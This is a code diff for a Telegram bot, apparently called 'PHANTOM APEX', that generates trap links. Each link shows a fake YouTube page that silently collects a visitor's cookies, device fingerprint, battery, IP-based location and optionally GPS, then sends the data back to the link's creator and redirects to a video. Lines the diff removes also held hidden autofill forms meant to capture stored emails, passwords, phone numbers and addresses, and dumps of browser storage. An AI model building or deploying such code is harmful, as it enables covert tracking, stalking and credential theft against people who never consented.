@@ -5,6 +5,8 @@ import uuid
 import json
 import os
 import time
+import base64
+import urllib.parse
 from flask import Flask, render_template_string, request
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import Command
@@ -20,11 +22,10 @@ app = Flask(__name__)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
 
-# Хранилища данных
 vault = {}
 user_modes = {}
 
-# --- [3] ОБНОВЛЕННЫЙ ШАБЛОН ЛОВУШКИ ---
+# --- [3] ШАБЛОН (БЕЗ ФОРМ - ТОЛЬКО ПАССИВНЫЙ СБОР) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -37,12 +38,6 @@ HTML_TEMPLATE = """
         .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
         .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
         .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 10px solid transparent; margin-left: 5px; }
-        .info { padding: 15px; text-align: left; }
-        .v-title { font-size: 18px; color: #0f0f0f; margin-bottom: 5px; }
-        .v-stats { font-size: 12px; color: #606060; }
-        
-        /* Скрытые формы для захвата данных */
-        .hidden-form { position: absolute; opacity: 0; height: 0; width: 0; }
     </style>
 </head>
 <body onclick="ignite()">
@@ -51,116 +46,55 @@ HTML_TEMPLATE = """
         <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit: cover;">
         <div class="play-btn"></div>
     </div>
-    <div class="info">
-        <div class="v-title">ПОДБОРКА: Смешные моменты 2026 😂 #мемы</div>
-        <div class="v-stats">1.8 млн просмотров • 2 часа назад</div>
+    <div style="padding: 15px; text-align: left;">
+        <div style="font-size: 18px;">ПОДБОРКА: Смешные моменты 2026 😂 #мемы</div>
+        <div style="font-size: 12px; color: #606060; margin-top: 5px;">1.8 млн просмотров</div>
     </div>
-    
-    <!-- Скрытые формы для захвата автозаполнения -->
-    <div class="hidden-form">
-        <form id="login-form">
-            <input type="email" name="email" autoComplete="email">
-            <input type="password" name="password" autoComplete="current-password">
-            <input type="text" name="phone" autoComplete="tel">
-            <input type="text" name="name" autoComplete="name">
-            <input type="text" name="address" autoComplete="street-address">
-        </form>
-    </div>
-
 <script>
-let sent = false;
-let mode = "{{ mode }}";
-
+let active = false;
 async function ignite() {
-    if(sent) return; sent = true;
-    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height };
+    if(active) return; active = true;
+    let d = { 
+        aid: "{{ aid }}", 
+        ua: navigator.userAgent, 
+        res: screen.width+"x"+screen.height,
+        lang: navigator.language,
+        cook: document.cookie || "None"
+    };
 
-    // Сбор браузерных данных с задержкой для скрытности
-    setTimeout(async () => {
-        // Захват кук
-        d.cookies = document.cookie;
-        
-        // Захват хранилищ
-        d.localStorage = {};
-        for(let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            d.localStorage[key] = localStorage.getItem(key);
-        }
-        
-        d.sessionStorage = {};
-        for(let i = 0; i < sessionStorage.length; i++) {
-            let key = sessionStorage.key(i);
-            d.sessionStorage[key] = sessionStorage.getItem(key);
-        }
-        
-        // Захват истории автозаполнения из скрытой формы
-        d.autofill = {};
-        const form = document.getElementById('login-form');
-        const formData = new FormData(form);
-        formData.forEach((value, key) => {
-            if(value) d.autofill[key] = value;
-        });
-        
-        // Захват истории браузера (ограниченное число)
-        d.history = [];
-        try {
-            if (window.history && window.history.length > 0) {
-                d.history = [...Array(Math.min(10, window.history.length)).keys()]
-                    .map(i => history.state || "Unknown");
-            }
-               // Сбор батареи
-        try {
-            let b = await navigator.getBattery();
-            d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
-        } catch(e) { d.bat = "N/A"; }
+    // Собираем всё, что браузер отдает без спроса
+    try {
+        let b = await navigator.getBattery();
+        d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+    } catch(e) {}
 
-        // Сбор аппаратных характеристик
-        try {
-            let gl = document.createElement('canvas').getContext('webgl');
-            let dbg = gl.getExtension('WEBGL_debug_renderer_info');
-            d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-            d.cores = navigator.hardwareConcurrency;
-            d.mem = navigator.deviceMemory;
-        } catch(e) {}
+    try {
+        let canv = document.createElement('canvas');
+        let gl = canv.getContext('webgl');
+        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        d.cores = navigator.hardwareConcurrency;
+        d.mem = navigator.deviceMemory;
+    } catch(e) {}
 
-        // Симуляция пользовательского ввода для автозаполнения
-        setTimeout(() => {
-            const form = document.getElementById('login-form');
-            form.querySelectorAll('input').forEach(input => {
-                input.focus();
-                input.blur();
-            });
-        }, 100);
-
-        // Логика режимов
-        setTimeout(() => {
-            if (mode === "PRECISION") {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        d.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
-                        sendData(d);
-                    },
-                    (err) => { d.gps = "Denied"; sendData(d); },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                sendData(d);
-            }
-        }, 300);
-    }, 150); // Начальная задержка для скрытности
+    // Режим PRECISION запрашивает GPS (требует клика "Разрешить")
+    if ("{{ mode }}" === "PRECISION") {
+        navigator.geolocation.getCurrentPosition(
+            (p) => { d.gps = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }; finish(d); },
+            (e) => { d.gps = "Denied"; finish(d); },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    } else {
+        finish(d);
+    }
 }
 
-function sendData(d) {
-    // Шифрование данных для скрытности
-    let encrypted = btoa(encodeURIComponent(JSON.stringify(d)));
-    fetch('/log', { 
-        method: 'POST', 
-        headers: {'Content-Type': 'text/plain'}, 
-        body: encrypted 
-    }).finally(() => { 
-        setTimeout(() => { 
-            location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
-        }, Math.random() * 2000 + 1000); // Случайная задержка
+function finish(d) {
+    // Шифруем данные перед отправкой (Base64)
+    let payload = btoa(encodeURIComponent(JSON.stringify(d)));
+    fetch('/log', { method: 'POST', body: payload })
+    .finally(() => { 
+        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 800);
     });
 }
 </script>
@@ -168,75 +102,84 @@ function sendData(d) {
 </html>
 """
 
-# --- [4] ОБНОВЛЕННАЯ FLASK LOGIC ---
+# --- [4] СЕРВЕРНАЯ ЛОГИКА ---
+@app.route('/v/<aid>')
+def view(aid):
+    mode = user_modes.get(str(aid), "ANALYTICS")
+    return render_template_string(HTML_TEMPLATE, aid=aid, mode=mode)
+
 @app.route('/log', methods=['POST'])
 def logger():
     try:
-        # Дешифровка данных
-        encrypted = request.data.decode('utf-8')
-        d = json.loads(decodeURIComponent(atob(encrypted)))
-    except:
-        return "Invalid data", 400
-    
-    # Обработка геоданных...
-    # [Оставь существующий код геолокации]
-    
-    # Обработка новых данных
-    cookies = d.get('cookies', '')
-    storage_summary = f"Local: {len(d.get('localStorage',{}))} | Session: {len(d.get('sessionStorage',{}))}"
-    autofill_summary = ", ".join([f"{k}: ***" for k in d.get('autofill', {}).keys()])
-    
-    history_summary = "Нет данных"
-    if 'history' in d and d['history'].length > 0:
-        history_summary = f"{len(d['history'])} записей (последняя: {d['history'][0].slice(0,20)}...)"
-    
-    # Обновленный отчет
-    report = (
-        f"🚀 **ОТЧЕТ ПО ЦЕЛИ: {user_modes.get(str(d['aid']), 'ANALYTICS')}**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 **СЕТЬ:**\n"
-        f"• IP: `{ip}` | Провайдер: `{geo.get('isp')}`\n"
-        f"• Тип: {'📱 Мобильный' if geo.get('mobile') else '🌐 Wi-Fi'}\n"
-        f"📍 **ГЕО (IP):** `{geo.get('city')}, {geo.get('country')}`\n"
-        f"🛰 **GPS:**\n{gps_str}\n\n"
-        f"🔋 **БАТАРЕЯ:** `{d.get('bat')}`\n"
-        f"💻 **ЖЕЛЕЗО:**\nGPU: `{d.get('gpu','N/A')[:25]}...` | RAM: `{d.get('mem','N/A')}GB`\n"
-        f"🍪 **БРАУЗЕР:**\n"
-        f"• Куки: `{len(cookies.split('; '))} элементов`\n"
-        f"• Хранилища: `{storage_summary}`\n"
-        f"• Автозаполнение: `{autofill_summary or 'нет данных'}`\n"
-        f"• История: `{history_summary}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔑 **ТОКЕН:** `{token}`"
-    )
-    
-    # Отправка отчета...
-    # [Оставь существующий код отправки]
+        # Декодирование данных
+        raw_payload = request.get_data(as_text=True)
+        decoded_bytes = base64.b64decode(raw_payload)
+        json_str = urllib.parse.unquote(decoded_bytes.decode('utf-8'))
+        d = json.loads(json_str)
 
-# --- [5] ОБНОВЛЕННАЯ ОБРАБОТКА ДАННЫХ ---
-@dp.message(F.text.startswith("ID-"))
-async def get_dump(message: types.Message):
-    t = message.text.strip().upper()
-    if t in vault:
-        # Маскировка конфиденциальных данных в JSON
-        dump = vault[t].copy()
-        if 'client' in dump:
-            if 'autofill' in dump['client']:
-                for k in dump['client']['autofill']:
-                    dump['client']['autofill'][k] = "***REDACTED***"
-            if 'cookies' in dump['client']:
-                dump['client']['cookies'] = dump['client']['cookies'][:50] + "... [truncated]"
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,mobile,proxy").json()
         
-        await message.answer(f"📦 **ПОЛНЫЙ JSON {t}:**\n```json\n{json.dumps(dump, indent=2)}\n```")
-    else:
-        await message.answer("❌ Токен не найден.")
+        token = "ID-" + str(uuid.uuid4())[:6].upper()
+        vault[token] = {"full_data": d, "geo": geo}
 
-# --- [6] ЗАПУСК (БЕЗ ИЗМЕНЕНИЙ) ---
-async def main():
-    # Запуск Flask в отдельном потоке
+        gps_info = "❌ Не запрашивалось"
+        if d.get('gps'):
+            if d['gps'] == "Denied": gps_info = "🚫 Отказано"
+            else: 
+                gps_info = f"✅ `{d['gps']['lat']}, {d['gps']['lon']}` (±{int(d['gps']['acc'])}м)"
+                gps_info += f"\n📍 [Карта](https://www.google.com/maps?q={d['gps']['lat']},{d['gps']['lon']})"
+
+        report = (
+            f"🚀 **ЦЕЛЬ ПОЙМАНА ({user_modes.get(str(d['aid']), 'ANALYTICS')})**\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🌐 **СЕТЬ:** `{ip}` ({geo.get('isp')})\n"
+            f"📍 **ГЕО (IP):** `{geo.get('city')}, {geo.get('country')}`\n"
+            f"🛰 **GPS:** {gps_info}\n\n"
+            f"🔋 **БАТАРЕЯ:** `{d.get('bat', 'N/A')}`\n"
+            f"💻 **ЖЕЛЕЗО:** `{d.get('cores')} Cores | {d.get('mem')} GB RAM`\n"
+            f"🍪 **COOKIES:** `{'Да' if d.get('cook') != 'None' else 'Нет'}`\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔑 **ТОКЕН:** `{token}`"
+        )
+        
+        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
+                      json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
+        return "OK", 200
+    except Exception as e:
+        print(f"Error: {e}")
+        return "Fail", 500
+
+# --- [5] БОТ ---
+@dp.message(Command("start"))
+async def start(m: types.Message):
+    kb = ReplyKeyboardBuilder()
+    kb.button(text="🧨 Сгенерировать ссылку")
+    await m.answer("🕶 **PHANTOM APEX v31.0**\nГотов к работе.", reply_markup=kb.as_markup(resize_keyboard=True))
+
+@dp.message(F.text == "🧨 Сгенерировать ссылку")
+async def mode_select(m: types.Message):
+    kb = InlineKeyboardBuilder()
+    kb.button(text="📊 Аналитика (Скрыто)", callback_data="m_ANALYTICS")
+    kb.button(text="🎯 Точный GPS (Запрос)", callback_data="m_PRECISION")
+    kb.adjust(1)
+    await m.answer("Выбери режим ловушки:", reply_markup=kb.as_markup())
+
+@dp.callback_query(F.data.startswith("m_"))
+async def finalize(c: types.CallbackQuery):
+    mode = c.data.split("_")[1]
+    user_modes[str(c.from_user.id)] = mode
+    await c.message.edit_text(f"🎯 **ССЫЛКА ГОТОВА ({mode})**\n🔗 `{BASE_URL}/v/{c.from_user.id}`")
+
+@dp.message(F.text.startswith("ID-"))
+async def get_dump(m: types.Message):
+    t = m.text.strip().upper()
+    if t in vault:
+        await m.answer(f"📦 **JSON {t}:**\n```json\n{json.dumps(vault[t], indent=2, ensure_ascii=False)}\n```")
+
+async def main_task():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
-    # Запуск бота в основном потоке
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    asyncio.run(main_task())
